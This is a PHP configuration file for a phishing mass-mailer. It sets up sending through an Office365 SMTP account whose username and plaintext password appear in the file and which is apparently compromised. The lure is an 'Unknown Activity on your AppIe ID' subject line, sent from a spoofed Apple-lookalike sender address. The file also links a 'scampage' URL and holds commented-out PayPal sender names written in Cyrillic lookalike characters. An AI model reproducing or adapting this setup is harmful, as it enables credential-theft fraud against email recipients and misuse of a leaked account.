<?php
//include('Gx.function.php');
//Regards
date_default_timezone_set('America/New_York');
$date = date('F d, Y, h:i A T');

$randip       = "" . rand(1, 200) . "." . rand(1, 200) . "." . rand(1, 100) . "." . rand(1, 300) . "";
/*function nomer($randstr)
{
    $char = '0123456789';
    $str  = '';
    for ($i = 0;
        $i < $randstr;
        $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;

};
function cok($randstr){
    $char = '1234567890';
    $str  = '';
    for ($i = 0;$i < $randstr;$i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
} */

function cok($length){
  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return substr (str_shuffle ($chars),0,$length);
}
function nomer($length){
  $chars = '0123456789';
  return substr (str_shuffle ($chars),0,$length);
}
/* SMTP SETUP */
$smtp_acc = [
     [
        "host"     => "smtp.office365.com",
        "port"     => "587",
        "username" => "asrar.amir@intex.in",
        "password" => "vicky@789",
    ],

];

/* Features SETUP */

//print "mеmbeг".cok(1)."".nomer(2)."".RandString(1)."@ρауρаl.сοm";
$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 2,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "",
    "frommail"       => "asrar.amir@intex.in",
  //  "subject"        => " Hey. Case-Id ##randstring##".RandString(8)."",
    "subject"        => "Unknown Activity on your AppIe ID ##randstring##".RandString(8)." ",
    "msgfile"        => "file/letter/jembuty.html",
   // "filepdf"        => "file/attachment/bf.pdf",
    "scampage"       => ["https://sh4re.be/1675"],
    ];
//http://karykaty.com.br/a.php?##email##=".RandString(23)."
//crechemundodossonhos.com.br

$fname = array(
	"noreply@emaiI.appIe.com"
);
  //  'ΡауΡаl Rесονегу',
//    'Rесονегу ΡауΡаl',
